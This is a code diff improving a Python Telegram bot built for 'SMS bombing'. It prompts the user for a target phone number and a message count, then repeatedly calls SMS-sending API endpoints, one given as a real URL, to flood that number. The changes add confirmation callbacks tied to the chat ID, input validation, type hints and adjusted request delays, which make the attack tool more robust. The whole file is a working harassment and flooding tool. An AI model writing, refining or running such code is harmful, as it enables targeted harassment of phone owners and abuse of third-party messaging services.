@@ -3,6 +3,7 @@ from telegram.ext import (
     ApplicationBuilder,
     CommandHandler,
     MessageHandler,
+    CallbackQueryHandler,
     ConversationHandler,
     ContextTypes,
     filters,
@@ -30,13 +31,13 @@ WELCOME_MESSAGE = (
     "⚠️ *Use responsibly.*"
 )
 
-# API Endpoints for SMS Bombing (Multiple APIs for Power)
+# API Endpoints for SMS Bombing
 API_ENDPOINTS = [
     "https://bomberdemofor2hrtcs.vercel.app/api/trialapi?phone={number}",
-    "https://another-sms-api.example.com/send?phone={number}",  # Add more APIs here
+    # Add more APIs here if available
 ]
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Start the bot with a dark-themed keyboard."""
     reply_keyboard = [["💣 Bombing"]]
     markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True, resize_keyboard=True)
@@ -47,7 +48,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     return ASK_NUMBER
 
-async def ask_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def ask_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Validate the 'Bombing' button press."""
     if update.message.text != "💣 Bombing":
         await update.message.reply_text("🖤 Press *Bombing* to proceed!", parse_mode="Markdown")
@@ -59,7 +60,7 @@ async def ask_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     return ASK_LIMIT
 
-async def ask_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def ask_limit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Validate phone number and ask for SMS limit."""
     number = update.message.text.strip()
 
@@ -82,8 +83,8 @@ async def ask_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     return CONFIRM
 
-async def confirm_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Confirm the attack details and execute."""
+async def confirm_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Validate SMS limit and show confirmation."""
     try:
         limit = int(update.message.text.strip())
         if limit < 1 or limit > 100:
@@ -111,8 +112,8 @@ async def confirm_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Confirmation keyboard
     confirm_keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("✅ Confirm", callback_data="confirm")],
-        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
+        [InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_{chat_id}")],
+        [InlineKeyboardButton("❌ Cancel", callback_data=f"cancel_{chat_id}")]
     ])
     await update.message.reply_text(
         f"🕸️ *Target*: {number}\n"
@@ -124,21 +125,36 @@ async def confirm_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_data[chat_id]["limit"] = limit
     return ConversationHandler.END
 
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle confirmation/cancellation."""
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle confirmation/cancellation buttons."""
     query = update.callback_query
     await query.answer()
 
     chat_id = query.message.chat_id
-    number = user_data.get(chat_id, {}).get("number")
-    limit = user_data.get(chat_id, {}).get("limit")
+    data = query.data.split("_")
+    action = data[0]
 
-    if query.data == "cancel":
+    if action not in ["confirm", "cancel"] or int(data[1]) != chat_id:
+        await query.message.reply_text("❌ Invalid action!", parse_mode="Markdown")
+        return
+
+    if action == "cancel":
         await query.message.reply_text("🛑 Attack cancelled.", parse_mode="Markdown")
         user_data.pop(chat_id, None)
         return
 
     # Execute the attack
+    number = user_data.get(chat_id, {}).get("number")
+    limit = user_data.get(chat_id, {}).get("limit")
+
+    if not number or not limit:
+        await query.message.reply_text(
+            "😵‍💫 Something broke! Restart with /start",
+            parse_mode="Markdown"
+        )
+        user_data.pop(chat_id, None)
+        return
+
     await query.message.reply_text(
         f"💥 *Firing {limit} SMS to {number}...*",
         parse_mode="Markdown"
@@ -149,12 +165,12 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for _ in range(limit):
             for api in API_ENDPOINTS:
                 try:
-                    async with session.get(api.format(number=number), timeout=5) as resp:
+                    async with session.get(api.format(number=number), timeout=10) as resp:
                         if resp.status == 200:
                             success += 1
                         else:
                             fail += 1
-                        await asyncio.sleep(0.5)  # Rate limiting
+                        await asyncio.sleep(2)  # 2-second delay
                 except Exception as e:
                     logger.error(f"API error: {e}")
                     fail += 1
@@ -179,22 +195,22 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     user_data.pop(chat_id, None)
 
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Cancel the operation."""
     await update.message.reply_text("🛑 Operation cancelled.", parse_mode="Markdown")
     user_data.pop(update.effective_chat.id, None)
     return ConversationHandler.END
 
-async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Handle errors gracefully."""
     logger.error(f"Update {update} caused error {context.error}")
-    if update and update.message:
+    if update and hasattr(update, 'message') and update.message:
         await update.message.reply_text(
             "😵‍💫 An error occurred! Try again with /start",
             parse_mode="Markdown"
         )
 
-def main():
+def main() -> None:
     """Run the bot."""
     app = ApplicationBuilder().token(BOT_TOKEN).build()
 
